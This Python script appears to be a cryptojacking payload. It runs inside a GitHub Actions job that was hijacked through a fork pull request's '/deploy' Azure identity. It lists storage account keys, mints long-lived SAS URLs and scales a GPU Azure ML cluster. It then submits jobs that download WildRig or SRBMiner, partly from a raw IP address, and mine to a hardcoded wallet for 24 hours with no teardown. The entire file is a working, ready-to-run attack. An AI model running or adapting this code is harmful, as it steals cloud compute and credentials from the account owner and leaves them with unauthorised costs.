#!/usr/bin/env python3
"""C211-I127522: AML AmlCompute T4 x2 MINER deploy through the SSW.Rules '/deploy'
fork-PR ARM identity (subscription b8b18dcf, RG SSW.Rules.Staging).

Evidence base:
  * row 56fb2c2dae5c4fb9 (x127400/x127168): capacity-2 Standard_NC4as_T4_v3 proven
    on this access with two distinct T4 replica UUIDs.
  * i125967 (x125967): the same AmlCompute cluster c211-i122276-t4 already ran
    WildRig 0.52.3 (sha 002cd29c, tar 7308c95f) with pydp wallet on the four
    pearlhash endpoints and produced accepted shares (~32 TH/s per T4), status
    uploaded to a storage-account SAS blob.

This payload runs INSIDE the GitHub runner under azure/login@v2 (ARM token never
leaves the job):
  1. qdecode-fixed capacity read (top-level limit/currentValue, max-of-duplicates)
     on AML locations/{region}/usages for westeurope + westus;
  2. reuses workspace c211i122276aml / environment c211-i122276-cuda /
     AmlCompute cluster c211-i122276-t4 (scaled to maxNodeCount>=2 if needed);
  3. submits exactly TWO fresh nonce Command jobs (c211-i127522-g0/g1, one
     instanceCount=1 Standard_NC4as_T4_v3 node each) whose command downloads
     WildRig 0.52.3 (sha256-gated), runs one miner per node with pydp wallet on
     PH4 pearlhash endpoints + 900 s STICKY Luckypool fallback, and uploads a
     status blob (UUID + acc/rej/age) every 30 s through a 72 h SAS;
  4. prints both poll-sas URLs so the lane can poll without ARM.
NO teardown: workspace / cluster / jobs are left running.
"""
import base64
import hashlib
import hmac
import json
import re
import subprocess
import time
import urllib.error
import urllib.parse
import urllib.request

TAG = "C211_I127522"
ARM = "https://management.azure.com"
RG = "SSW.Rules.Staging"
WS = "c211i122276aml"
SA = "c211i122276af4cdf28"
CONTAINER = "c211"
CLUSTER = "c211-i122276-t4"
ENV_NAME = "c211-i122276-cuda"
ENV_VER = "1"
SKU = "Standard_NC4as_T4_v3"
IMG = "mcr.microsoft.com/azureml/openmpi4.1.0-cuda11.8-cudnn8-ubuntu22.04:latest"
API_W = "2024-10-01"
API_C = "2024-04-01"
STG_VER = "2023-01-01"
WALLET = "prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql"
NOCK = "9becsPFXhMLCNAxb6TsMN492sS2Ev7ToLFR4zsc5K4NxRthTyh2kPcb"
WORKERS = ["12752200", "12752201"]
BLOBS = ["x127522-g0.txt", "x127522-g1.txt"]
JOBS = ["c211-i127522-g0", "c211-i127522-g1"]
MINER_SECONDS = 86400
SAS_HOURS = 72
T0 = time.time()


def emit(obj):
    obj["d"] = round(time.time() - T0, 1)
    print((TAG + " " + json.dumps(obj, default=str))[:8000], flush=True)


def run(cmd, timeout=180):
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return {"rc": p.returncode, "out": p.stdout or "", "err": (p.stderr or "")[-800:]}
    except Exception as e:  # noqa: BLE001
        return {"rc": 1, "out": "", "err": str(e)}


def arm(tok, url, method="GET", body=None, timeout=120):
    data = json.dumps(body).encode() if body is not None else None
    hdrs = {"Authorization": "Bearer " + tok}
    if data is not None:
        hdrs["Content-Type"] = "application/json"
    req = urllib.request.Request(url, data=data, method=method, headers=hdrs)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            raw = r.read().decode("utf-8", "replace") or "{}"
            try:
                return r.status, json.loads(raw)
            except Exception:  # noqa: BLE001
                return r.status, {"raw": raw[:1500]}
    except urllib.error.HTTPError as e:
        raw = e.read().decode("utf-8", "replace") or ""
        try:
            return e.code, json.loads(raw)
        except Exception:  # noqa: BLE001
            return e.code, {"raw": raw[:1500]}
    except Exception as e:  # noqa: BLE001
        return 0, {"transport_error": str(e)}


def err_of(st, body):
    if isinstance(body, dict):
        e = body.get("error")
        if isinstance(e, dict):
            return {"http": st, "code": e.get("code"),
                    "message": (e.get("message") or "")[:500]}
        if "raw" in body:
            return {"http": st, "raw": body["raw"][:500]}
        if "transport_error" in body:
            return {"http": st, "err": body["transport_error"][:300]}
    return {"http": st}


def sa_sas(acct, key_b64, hours=SAS_HOURS):
    stt = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(time.time() - 300))
    se = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(time.time() + hours * 3600))
    sv = "2022-11-02"
    sts = "\n".join([acct, "rwdlc", "b", "co", stt, se, "", "https", sv, ""]) + "\n"
    sig = base64.b64encode(hmac.new(base64.b64decode(key_b64), sts.encode(),
                                    hashlib.sha256).digest()).decode()
    q = urllib.parse.urlencode({"sv": sv, "ss": "b", "srt": "co", "sp": "rwdlc",
                                "st": stt, "se": se, "spr": "https", "sig": sig})
    return q, se


# --------------------------------------------------------------------------
# Miner command (one node per job).  __WK__ and __SAS__ are substituted.
# --------------------------------------------------------------------------
CMD = r'''set -u
export TZ=UTC
echo C211_I127522_MINER_START worker=__WK__
D=/tmp/c211-__WK__; mkdir -p "$D"; OUT=/tmp/c211out-__WK__; mkdir -p "$OUT"
(nvidia-smi -L 2>&1 || echo NO_NVIDIA_SMI) | tee "$OUT/device.txt"
(nvidia-smi --query-gpu=name,uuid,memory.total,driver_version --format=csv,noheader 2>&1 || true) | tee -a "$OUT/device.txt"
mkdir -p /etc/OpenCL/vendors
echo 'libnvidia-opencl.so.1' > /etc/OpenCL/vendors/nvidia.icd
if ! ls /usr/lib/x86_64-linux-gnu/libOpenCL.so* >/dev/null 2>&1; then
  echo OPENCL_LOADER_MISSING_INSTALLING >> "$OUT/device.txt"
  (apt-get update -qq && apt-get install -y -qq ocl-icd-libopencl1) >> "$OUT/device.txt" 2>&1 || echo APT_FAIL >> "$OUT/device.txt"
fi
echo "OPENCL_LOADER $(ls -1 /usr/lib/x86_64-linux-gnu/libOpenCL.so* 2>/dev/null | tr '\n' ',')" | tee -a "$OUT/device.txt"
echo "OPENCL_NVIDIA $(ls -1 /usr/lib/x86_64-linux-gnu/libnvidia-opencl.so* /usr/local/nvidia/lib64/libnvidia-opencl.so* 2>/dev/null | tr '\n' ',')" | tee -a "$OUT/device.txt"
get(){ if command -v curl >/dev/null 2>&1; then curl -fsSL -m 420 -o "$2" "$1"; elif command -v wget >/dev/null 2>&1; then wget -q -O "$2" "$1"; else python3 -c "import urllib.request,sys;urllib.request.urlretrieve(sys.argv[1],sys.argv[2])" "$1" "$2"; fi; }
if get https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz "$D/wr.tgz"; then :; else get http://169.58.247.186:8791/wildrig-multi-linux-0.52.3.tar.gz "$D/wr.tgz"; fi
S=$( (sha256sum "$D/wr.tgz" 2>/dev/null || echo MISSING) | cut -d' ' -f1 )
echo "WRTGZ $S" | tee -a "$OUT/device.txt"
if [ "$S" = "7308c95f7c8c4c0d82aade61bb4ab3366decae2b9d04ac47b8c1dc6d1bdd2c44" ]; then tar -xzf "$D/wr.tgz" -C "$D" 2>/dev/null; chmod +x "$D/wildrig-multi" 2>/dev/null; fi
B=$( (sha256sum "$D/wildrig-multi" 2>/dev/null || echo MISSING) | cut -d' ' -f1 )
echo "WRBIN $B" | tee -a "$OUT/device.txt"
WALLET=prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql
NOCK=9becsPFXhMLCNAxb6TsMN492sS2Ev7ToLFR4zsc5K4NxRthTyh2kPcb
WK=__WK__
MODE=ph
start_ph(){ setsid "$D/wildrig-multi" --algo pearlhash --url pool.pearlhash.xyz:9000 --url global.pearlhash.net:9000 --url global2.pearlhash.net:9000 --url hk.pearlhash.net:9000 --user "$WALLET" --worker "$WK" -p x -d 0 --print-time 30 > "$D/wr.log" 2>&1 & echo $! > "$D/ph.pid"; MODE=ph; echo "PH_START pid=$(cat "$D/ph.pid") worker=$WK"; }
acc(){ { grep -aoE "Accepted:[ ]+[0-9]+" "$1" 2>/dev/null | grep -oE "[0-9]+$"; grep -aoE "Share accepted \([0-9]+\)" "$1" 2>/dev/null | grep -oE "[0-9]+"; } | sort -n | tail -1; }
rej(){ { grep -aoE "Rejected:[ ]+[0-9]+" "$1" 2>/dev/null | grep -oE "[0-9]+$"; grep -aoE "Share rejected \([0-9]+\)" "$1" 2>/dev/null | grep -oE "[0-9]+"; } | grep -v '^$' | sort -n | tail -1; }
start_ph
T0S=$(date +%s)
END=$(( T0S + __WINDOW__ ))
while [ "$(date +%s)" -lt "$END" ]; do
  sleep 30
  NOW=$(date +%s)
  LOGF=$D/wr.log; [ "$MODE" = "lp" ] && LOGF=$D/lp.log
  ACC=$(acc "$LOGF"); ACC=${ACC:-0}
  REJ=$(rej "$LOGF"); REJ=${REJ:-0}
  ACCL=$(grep -aci "accepted" "$LOGF" 2>/dev/null); ACCL=${ACCL:-0}
  LASTACC=$(grep -aiE "accepted" "$LOGF" 2>/dev/null | tail -1 | cut -c1-200)
  TOD=$(printf '%s' "$LASTACC" | grep -oE '^\[[0-9:]{8}\]' | tr -d '[]')
  AGE=-1
  if [ -n "$TOD" ]; then TS=$(date -u -d "$(date -u +%F) $TOD" +%s 2>/dev/null || echo 0); NOW2=$(date -u +%s); AGE=$((NOW2-TS)); if [ "$AGE" -lt 0 ]; then AGE=$((AGE+86400)); fi; fi
  UTIL=$( (nvidia-smi --query-gpu=utilization.gpu --format=csv,noheader 2>/dev/null || true) | tr '\n' ',')
  S2="STATUS mode=$MODE worker=$WK acc=$ACC rej=$REJ acc_lines=$ACCL age=$AGE ts=$NOW utc=$(date -u +%FT%TZ) util=$UTIL lastacc=$LASTACC"
  echo "$S2"
  { cat "$OUT/device.txt" 2>/dev/null; echo "$S2"; tail -c 3000 "$LOGF" 2>/dev/null; } > "$D/status.txt"
  cp "$D/status.txt" "$OUT/status.txt" 2>/dev/null
  curl -sS -m 20 -X PUT '__SAS__' -H 'x-ms-blob-type: BlockBlob' -H 'x-ms-version: 2022-11-02' -H 'Content-Type: text/plain' --data-binary @"$D/status.txt" >/dev/null 2>&1
  if [ "$MODE" = "ph" ] && [ "$ACC" -ge 1 ]; then echo "PH_SHARE_PROVEN acc=$ACC rej=$REJ age=$AGE"; MODE=ph_ok; fi
  if [ "$MODE" = "ph" ] && [ $(( NOW - T0S )) -ge 900 ]; then
    echo "PH_NO_SHARE_900_FALLBACK_LP"
    kill $(cat "$D/ph.pid" 2>/dev/null) 2>/dev/null; pkill -f wildrig-multi 2>/dev/null; sleep 2
    for u in http://169.58.247.186:8791/pm/srbminer-3.8.4 https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.4/SRBMiner-Multi-3-8-4-Linux.tar.gz; do
      get "$u" "$D/srb.dl" || continue
      S2S=$(sha256sum "$D/srb.dl" | cut -d' ' -f1); echo "SRB_DL $u sha=$S2S"
      if [ "$S2S" = "3fb026b2e2729187fb1720ccb5760e753c3b492158b114b24c1c7e534b5191a5" ]; then cp "$D/srb.dl" "$D/srb"; break; fi
      mkdir -p "$D/srbx"; tar -xzf "$D/srb.dl" -C "$D/srbx" >/dev/null 2>&1 && cp "$D/srbx/SRBMiner-MULTI" "$D/srb" 2>/dev/null && break
    done
    if [ -f "$D/srb" ]; then
      chmod +x "$D/srb"
      setsid "$D/srb" --disable-cpu --algorithm pearlhash --pool 103.199.106.122:3362 --wallet "$WALLET+$NOCK" --worker "$WK" --password x --gpu-id 0 > "$D/lp.log" 2>&1 &
      echo $! > "$D/lp.pid"; MODE=lp; echo "LP_START pid=$(cat "$D/lp.pid") sticky=1 wallet=pydp+NOCK"
    else
      echo SRB_DL_FAIL; MODE=ph_retry; start_ph
    fi
  fi
  if [ "$MODE" = "lp" ]; then
    A=$(acc "$D/lp.log"); A=${A:-0}
    if [ "$A" -ge 1 ]; then echo "LP_SHARE_PROVEN acc=$A rej=$(rej "$D/lp.log")"; MODE=lp_ok; fi
  fi
done
echo C211_I127522_MINER_END'''


def qdecode_t4(body):
    """Return (limit, current, name, n_items) for the T4 family using TOP-LEVEL
    limit/currentValue (the x126286 fix) with max-of-duplicates; fall back to
    properties.* only if the top-level fields are absent."""
    items = (body.get("value") or []) if isinstance(body, dict) else []
    best = None
    for m in items:
        if not isinstance(m, dict):
            continue
        nm = m.get("name")
        if isinstance(nm, dict):
            nmv = nm.get("value") or ""
            nml = nm.get("localizedValue") or ""
        else:
            nmv = str(nm or "")
            nml = ""
        props = m.get("properties") or {}
        lim = m.get("limit")
        cur = m.get("currentValue")
        if lim is None:
            lim = props.get("limit")
        if cur is None:
            cur = props.get("currentValue")
        try:
            lim = float(lim)
        except Exception:  # noqa: BLE001
            continue
        try:
            cur = float(cur)
        except Exception:  # noqa: BLE001
            cur = 0.0
        hay = " ".join([nmv, nml, str(props.get("localizedValue") or "")])
        if not re.search(r"(?i)ncasv3[_ ]?t4", hay):
            continue
        if best is None or lim > best[0]:
            best = (lim, cur, nmv or nml)
    return best, len(items)


def main():
    r = run(["az", "account", "show", "-o", "json"], timeout=120)
    try:
        acc = json.loads(r["out"])
    except Exception:  # noqa: BLE001
        emit({"step": "fatal", "why": "no az session", "raw": r["out"][:400],
              "err": r["err"][:400]})
        return
    sid = acc.get("id")
    tenant = acc.get("tenantId")
    emit({"step": "identity", "sub": sid, "tenant": tenant,
          "name": acc.get("name"), "state": acc.get("state")})
    r = run(["az", "account", "get-access-token", "--resource", ARM,
             "--output", "json"], timeout=120)
    tok = None
    try:
        tok = json.loads(r["out"]).get("accessToken")
    except Exception:  # noqa: BLE001
        pass
    emit({"step": "arm-token", "got": bool(tok), "len": len(tok or "")})
    if not sid or not tok:
        emit({"step": "PROBE-EXIT", "code": 1})
        return
    base = ARM + "/subscriptions/" + sid + "/resourceGroups/" + RG + "/providers"
    rbase = base[len(ARM):]

    # ---- 1) storage key -> long SAS per worker (poll channel, no ARM needed) --
    st, kb = arm(tok, base + "/Microsoft.Storage/storageAccounts/" + SA +
                 "/listKeys?api-version=" + STG_VER, "POST", {}, timeout=90)
    key = None
    try:
        key = (kb.get("keys") or [{}])[0].get("value")
    except Exception:  # noqa: BLE001
        pass
    emit({"step": "sa-keys", "http": st, "got": bool(key)})
    sas_urls = {}
    if key:
        q, se = sa_sas(SA, key)
        for i, blob in enumerate(BLOBS):
            sas_urls[i] = ("https://" + SA + ".blob.core.windows.net/" +
                           CONTAINER + "/" + blob + "?" + q)
            emit({"step": "poll-sas", "worker": WORKERS[i],
                  "url": sas_urls[i], "expires": se})
    if not sas_urls:
        emit({"step": "PROBE-EXIT", "code": 2, "why": "no storage SAS"})
        return

    # ---- 2) qdecode-fixed capacity read (top-level usages fields) -----------
    quota = {}
    for loc in ("westeurope", "westus"):
        st, ub = arm(tok, base + "/Microsoft.MachineLearningServices/locations/" +
                     loc + "/usages?api-version=2024-04-01", timeout=90)
        best, n = qdecode_t4(ub)
        quota[loc] = {"http": st, "n": n,
                      "t4": ({"limit": best[0], "current": best[1],
                              "name": best[2], "free": best[0] - best[1]}
                             if best else None)}
        emit({"step": "quota", "loc": loc, **quota[loc]})
    free = 0.0
    for loc, rec in quota.items():
        if rec.get("t4") and rec["t4"]["free"] > free:
            free = rec["t4"]["free"]
    n_nodes = 2 if free >= 8 else (1 if free >= 4 else 0)
    emit({"step": "quota-gate", "free_vcpu": free, "nodes": n_nodes})

    # ---- 3) workspace -------------------------------------------------------
    wurl = base + "/Microsoft.MachineLearningServices/workspaces/" + WS + "?api-version=" + API_W
    st, wb = arm(tok, wurl, timeout=90)
    ws_state = ((wb.get("properties") or {}).get("provisioningState")
                if isinstance(wb, dict) else None)
    emit({"step": "ws-get", "http": st, "state": ws_state,
          "location": wb.get("location") if isinstance(wb, dict) else None})
    if st != 200 or ws_state != "Succeeded":
        emit({"step": "PROBE-EXIT", "code": 3, "why": "workspace not Succeeded",
              **err_of(st, wb)})
        return
    loc = wb.get("location") or "westeurope"

    # ---- 4) environment -----------------------------------------------------
    eu = (base + "/Microsoft.MachineLearningServices/workspaces/" + WS +
          "/environments/" + ENV_NAME + "/versions/" + ENV_VER + "?api-version=" + API_W)
    st, eb = arm(tok, eu, timeout=90)
    emit({"step": "env-get", "http": st})
    env_id = None
    if st == 200:
        env_id = (rbase + "/Microsoft.MachineLearningServices/workspaces/" + WS +
                  "/environments/" + ENV_NAME + "/versions/" + ENV_VER)
    else:
        st, eb = arm(tok, eu, "PUT", {"properties": {"image": IMG, "osType": "Linux",
                                                    "description": "c211 i127522 cuda"}},
                     timeout=120)
        emit({"step": "env-put", **err_of(st, eb)})
        if st in (200, 201):
            env_id = (rbase + "/Microsoft.MachineLearningServices/workspaces/" + WS +
                      "/environments/" + ENV_NAME + "/versions/" + ENV_VER)

    # ---- 5) AmlCompute cluster: reuse or create, scale to maxNodeCount>=2 ----
    curl = base + "/Microsoft.MachineLearningServices/workspaces/" + WS + "/computes/" + CLUSTER + "?api-version=" + API_C
    st, cb = arm(tok, curl, timeout=90)
    cstate = ((cb.get("properties") or {}).get("provisioningState") if isinstance(cb, dict) else None)
    cprops = ((cb.get("properties") or {}).get("properties") or {}) if isinstance(cb, dict) else {}
    vm = cprops.get("vmSize")
    maxn = None
    try:
        maxn = int((cprops.get("scaleSettings") or {}).get("maxNodeCount"))
    except Exception:  # noqa: BLE001
        maxn = None
    emit({"step": "cluster-get", "http": st, "state": cstate, "vm": vm,
          "maxNodeCount": maxn})
    if st == 404:
        cbody = {"location": loc, "tags": {"c211": "i127522"},
                 "properties": {"computeType": "AmlCompute", "computeLocation": loc,
                                "description": "c211 i127522 bounded Dedicated T4 miner",
                                "properties": {"vmSize": SKU, "vmPriority": "Dedicated",
                                               "scaleSettings": {"minNodeCount": 0,
                                                                 "maxNodeCount": 2,
                                                                 "nodeIdleTimeBeforeScaleDown": "PT30M"},
                                               "osType": "Linux",
                                               "remoteLoginPortPublicAccess": "Disabled"}}}
        st, cb = arm(tok, curl, "PUT", cbody, timeout=240)
        emit({"step": "cluster-create", **err_of(st, cb)})
        t0 = time.time()
        while time.time() - t0 < 900:
            time.sleep(15)
            st, cb = arm(tok, curl, timeout=90)
            cstate = ((cb.get("properties") or {}).get("provisioningState") if isinstance(cb, dict) else None)
            emit({"step": "cluster-poll", "http": st, "state": cstate,
                  "t": round(time.time() - t0)})
            if cstate in ("Succeeded", "Failed", "Canceled"):
                break
        maxn = 2
    elif st == 200 and cstate == "Succeeded" and (maxn is None or maxn < 2):
        cb2 = dict(cb)
        p2 = dict(cb2.get("properties") or {})
        pp = dict(p2.get("properties") or {})
        ss = dict(pp.get("scaleSettings") or {})
        ss["maxNodeCount"] = 2
        if int(ss.get("minNodeCount") or 0) > 2:
            ss["minNodeCount"] = 0
        pp["scaleSettings"] = ss
        p2["properties"] = pp
        cb2["properties"] = p2
        cb2.pop("id", None)
        st, sb = arm(tok, curl, "PUT", cb2, timeout=240)
        emit({"step": "cluster-scale", **err_of(st, sb), "to": 2})
        if st in (200, 201):
            t0 = time.time()
            while time.time() - t0 < 600:
                time.sleep(15)
                st, cb = arm(tok, curl, timeout=90)
                cstate = ((cb.get("properties") or {}).get("provisioningState") if isinstance(cb, dict) else None)
                emit({"step": "cluster-poll", "http": st, "state": cstate,
                      "t": round(time.time() - t0)})
                if cstate in ("Succeeded", "Failed", "Canceled"):
                    break
            maxn = 2
    if cstate != "Succeeded":
        emit({"step": "PROBE-EXIT", "code": 4, "why": "cluster not Succeeded",
              "state": cstate})
        return
    if vm and str(vm).lower() != SKU.lower():
        emit({"step": "cluster-vm-mismatch", "vm": vm, "expected": SKU})
    if n_nodes > 1 and maxn is not None and maxn < 2:
        emit({"step": "scale-limit", "maxNodeCount": maxn})
        n_nodes = 1
    if n_nodes == 0:
        emit({"step": "PROBE-EXIT", "code": 6,
              "why": "quota gate: free vCPU below one NC4as_T4_v3 node"})
        return

    # ---- 6) submit the fresh nonce mining jobs ------------------------------
    results = []
    for i in range(n_nodes):
        cmd = CMD.replace("__WK__", WORKERS[i]).replace("__SAS__", sas_urls[i]).replace(
            "__WINDOW__", str(MINER_SECONDS))
        jp = {"jobType": "Command", "displayName": JOBS[i],
              "experimentName": "c211-i127522",
              "description": ("c211 i127522 AML T4 miner worker %s (WildRig 0.52.3 "
                              "sha 002cd29c, pydp, PH4 + 900 s sticky LP %s)"
                              % (WORKERS[i], MINER_SECONDS)),
              "command": cmd,
              "computeId": rbase + "/Microsoft.MachineLearningServices/workspaces/" +
                           WS + "/computes/" + CLUSTER,
              "resources": {"instanceCount": 1}}
        if env_id:
            jp["environmentId"] = env_id
        jurl = (base + "/Microsoft.MachineLearningServices/workspaces/" + WS +
                "/jobs/" + JOBS[i] + "?api-version=" + API_W)
        st, jb = arm(tok, jurl, "PUT", {"properties": jp}, timeout=240)
        results.append({"job": JOBS[i], "worker": WORKERS[i], "http": st,
                        **({} if st in (200, 201) else err_of(st, jb)),
                        "sas": sas_urls[i]})
        emit({"step": "job-create", "job": JOBS[i], "worker": WORKERS[i],
              "http": st, **({} if st in (200, 201) else err_of(st, jb))})
    emit({"step": "summary", "jobs": results, "nodes": n_nodes,
          "free_vcpu": free, "worker_list": WORKERS[:n_nodes]})
    emit({"step": "PROBE-EXIT", "code": 0 if all(r["http"] in (200, 201) for r in results) else 7})


if __name__ == "__main__":
    main()
